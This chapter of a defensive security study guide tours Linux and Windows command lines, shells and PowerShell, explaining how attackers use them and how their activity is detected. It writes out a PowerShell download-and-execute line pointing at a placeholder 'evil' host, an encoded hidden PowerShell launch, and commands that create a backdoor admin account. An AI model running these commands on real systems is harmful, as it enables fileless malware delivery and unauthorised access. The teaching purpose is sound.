# Chapter 5 — Tools of the Trade

The most practical chapter so far. Everything here is something you actually run, and the reason it matters for security is that **almost all attacker activity and almost all detection happens at the command line and in log files**, not in a GUI.

## 5.1 Touring the CLI

### Why the CLI at all

Fair question when every OS ships a graphical interface. The reasons hold up:

* **Automatable.** A GUI action can't be scripted, scheduled, version-controlled or repeated identically across 500 machines. A command can.
* **Remote and low-bandwidth.** SSH over a bad link works; remote desktop doesn't.
* **Precise and loggable.** A command is an exact, recordable statement of what was done. "I clicked around in the settings" is not.
* **It's what attackers use.** Post-exploitation happens on the command line, so reading command-line activity is how you detect it. A defender who can't read a shell command can't read the evidence.
* **Headless systems have nothing else.** Servers and containers usually have no GUI at all.

### Core Linux navigation and inspection

```bash
pwd                     # where am I
ls -la                  # list everything, including hidden, with permissions
cd /var/log             # move
find / -name "*.conf" 2>/dev/null       # search the filesystem
grep -r "password" /etc/                # search inside files
cat / less / head / tail                # read files
tail -f /var/log/auth.log               # follow a log live
```

### Security-relevant commands worth knowing cold

```bash
# who is on the system and what are they doing
whoami; id; w; last

# what's running
ps aux
top / htop

# what's listening on the network — the single most useful triage command
ss -tulpn               # modern
netstat -tulpn          # older systems

# permissions and ownership
chmod 600 file
chown user:group file

# what did this user do
history
```

`ss -tulpn` deserves its own note. It answers **"what on this machine is accepting connections, and which process owns it?"** — which is the first question for both hardening (attack surface reduction, chapter 6) and incident response (is there a listener that shouldn't be there?).

### Pipes and redirection

The thing that makes the CLI compose:

```bash
cat access.log | grep "404" | wc -l              # count 404s
ps aux | grep nginx                              # filter process list
command > file          # redirect stdout, overwrite
command >> file         # append
command 2>/dev/null     # discard errors
command 2>&1            # merge stderr into stdout
```

Chaining small tools is the entire Unix philosophy and it's why log analysis on the CLI is fast.

## 5.2 Shells

A **shell** is the program that interprets your commands. The terminal is just the window; the shell is what's reading.

### Linux shells

* **bash** - the default nearly everywhere. What scripts assume.
* **sh / dash** - minimal POSIX shell. Faster, fewer features, what `#!/bin/sh` gets you.
* **zsh** - bash-compatible with better completion and prompts. macOS default now.
* **fish** - friendly, and deliberately *not* POSIX-compatible, so scripts break.

`/etc/shells` lists valid login shells. Setting a user's shell to `/usr/sbin/nologin` or `/bin/false` prevents interactive login — which is what service accounts should have (chapter 4.9).

### Security relevance of shells

* **Reverse shells** - the standard post-exploitation payload. The victim machine connects *outbound* to the attacker, because outbound is usually permitted and inbound is usually firewalled. This is exactly why **egress filtering** matters and why most networks are far weaker on it than on ingress.
* **Shell history** - `~/.bash_history` is a genuine intelligence source in both directions. For defenders it shows what an attacker ran; for attackers it frequently contains passwords typed on the command line, hostnames, and internal paths. credhound treats history files as a lead for exactly this reason.
* **Restricted shells** (`rbash`) limit what a user can do, and are usually escapable — treat as a speed bump.

### Environment variables

```bash
echo $PATH
export API_KEY=xyz      # visible to child processes
env                     # list all
```

**Security note:** environment variables are readable via `/proc/<pid>/environ` by the process owner and by root. Passing secrets this way is common (containers do it constantly) and it means any local privilege escalation exposes every secret in every running process. That's a planned later slice of credhound for the same reason.

`PATH` order matters too — a writable directory early in `PATH` lets an attacker shadow a legitimate binary.

## 5.3 The Windows Command Line

`cmd.exe`. Older, more limited than PowerShell, and still worth knowing because it appears constantly in malware and in incident logs.

```cmd
dir                     :: list
cd                      :: change directory
type file.txt           :: read a file
copy / move / del       :: file operations

ipconfig /all           :: network configuration
ipconfig /flushdns      :: clear DNS cache
ping / tracert          :: connectivity
netstat -ano            :: connections with owning PID
nslookup                :: DNS queries

tasklist                :: running processes
taskkill /PID 1234 /F   :: kill a process

net user                :: local accounts
net user hacker P@ss /add          :: create an account
net localgroup administrators hacker /add   :: make it an admin
net share               :: shared folders
net use                 :: mapped drives

sc query                :: services
systeminfo              :: OS, patches, domain
whoami /all             :: user, groups and privileges
```

### Why these specific commands matter

That block from `net user` onward is close to a standard attacker enumeration sequence. `whoami /all`, `systeminfo`, `net user`, `net localgroup administrators`, `net share` — run within seconds of each other by the same process — is a recognisable pattern of someone orienting themselves on a freshly compromised host.

Which means **the detection isn't any single command, it's the sequence and the timing.** That's the TTP idea from chapter 1.3 becoming concrete: individually these are all legitimate administrative commands, and in that order, in that timeframe, from a user who never runs them, it's an intrusion.

`netstat -ano` gives connections with the owning PID, which you then map with `tasklist` — the Windows equivalent of `ss -tulpn`.

## 5.4 Microsoft PowerShell

A proper scripting language and object pipeline, not just a command runner. Vastly more capable than `cmd`, which cuts both ways.

### Basics

Commands are `Verb-Noun`, which makes them guessable:

```powershell
Get-Process
Get-Service
Get-ChildItem                    # ls / dir
Get-Content file.txt             # cat / type
Get-Help Get-Process -Examples
```

### The key difference from bash

**PowerShell pipes objects, not text.** In bash, `ps aux | grep nginx` passes a string that you then have to parse with `awk` or `cut`. In PowerShell you pass a real object with typed properties:

```powershell
Get-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU -Descending | Select-Object Name, CPU
```

No parsing, no fragile column-counting. This is genuinely nicer for structured data, and it's why PowerShell is so effective for both administration and attack tooling.

### Security-relevant cmdlets

```powershell
Get-LocalUser
Get-LocalGroupMember Administrators
Get-NetTCPConnection                     # netstat equivalent
Get-WinEvent -LogName Security -MaxEvents 50
Get-FileHash file.exe -Algorithm SHA256
Get-ExecutionPolicy
```

### Why PowerShell dominates modern attacks

This is the part actually worth understanding:

* **It's pre-installed and signed** on every Windows machine, so it's a **living-off-the-land binary (LOLBin)** — the attacker brings no malware for a scanner to detect.
* **It runs in memory.** `IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')` fetches and executes a script that **never touches disk**. That's textbook **fileless malware** — nothing for signature-based AV to scan.
* **Deep system access** via .NET and WMI.
* **Easy obfuscation** — base64-encoded commands (`powershell -enc <blob>`), string concatenation, case randomisation.

`powershell.exe -nop -w hidden -enc <base64>` is close to a signature of malicious use by itself: no profile, hidden window, encoded command.

### Defences

* **Execution policy** - a guardrail against accidents, **not a security control.** It's bypassable with `-ExecutionPolicy Bypass` and half a dozen other ways. Don't count it.
* **Constrained Language Mode** - genuinely restricts what the language can do.
* **Script block logging and module logging** - records what actually executed, *including after de-obfuscation*, which is the single most valuable Windows logging setting for detection.
* **AMSI (Antimalware Scan Interface)** - lets AV inspect scripts at runtime, after decoding.
* **JEA (Just Enough Administration)** - constrained remote endpoints exposing only specific commands.

### The general lesson

PowerShell is the clearest example of **dual-use tooling**. The exact capability that makes it excellent for administration makes it excellent for attack. You cannot remove it without breaking Windows management, so the answer is **logging and constraining rather than blocking** — which is the same conclusion you reach for most legitimate admin tooling.

## 5.5 Linux Shells (scripting)

Same dual-use point, on the other OS.

```bash
#!/bin/bash
set -euo pipefail        # exit on error, undefined vars, and pipe failures

for user in $(cut -d: -f1 /etc/passwd); do
    echo "checking $user"
done

if [ -f /etc/shadow ]; then
    echo "shadow file present"
fi
```

`set -euo pipefail` at the top of every script is a habit worth forming — without it a failing command in the middle is silently ignored and the script continues in a broken state.

Attacker-relevant: cron jobs and systemd timers for persistence, `curl | bash` as the delivery pattern (and as a supply chain risk worth thinking about every time you run one), and `chmod +x` on a downloaded file.

